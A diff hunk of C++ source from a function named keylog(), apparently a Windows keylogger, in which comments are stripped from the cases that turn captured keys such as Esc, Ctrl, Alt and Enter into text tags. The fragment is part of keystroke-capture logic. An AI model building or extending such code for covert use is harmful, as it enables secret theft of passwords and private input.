@@ -69,31 +69,28 @@ void keylog(){
 							break;	
 						// Special Symbols Virtual Key 
 						case VK_ESCAPE:
-							write << "<Esc>"; //Esc (0x1B) 
+							write << "<Esc>";
 							break;
 						case VK_TAB:
-							write << "<Tab>"; //Tab (0x09)
+							write << "<Tab>";
 							break;
 						case VK_CAPITAL:
-							write << "<CapsLock>"; //Caps Lock (0x14) 
+							write << "<CapsLock>";
 							break;
-						// case VK_SHIFT:
-						// 	write << "<Shift>"; //Shift (0x10) 
-						// 	break;
 						case VK_CONTROL:
-							write << "<Ctrl>"; //Ctrl (0x11) 
+							write << "<Ctrl>";
 							break;
 						case VK_MENU:
-							write << "<Alt>"; //Alt (0x12) 
+							write << "<Alt>";
 							break;	
 						case VK_SPACE:
-							write << "<Space>"; //Space (0x20)
+							write << "<Space>";
 							break;	
 						case VK_BACK:
-							write << "<BackSpace>"; //Back Space (0x08)
+							write << "<BackSpace>";
 							break;
 						case VK_RETURN: 
-							write << "<Enter>\n"; //Enter (0x0D)
+							write << "<Enter>\n";
 							break;
 					}
 				}					
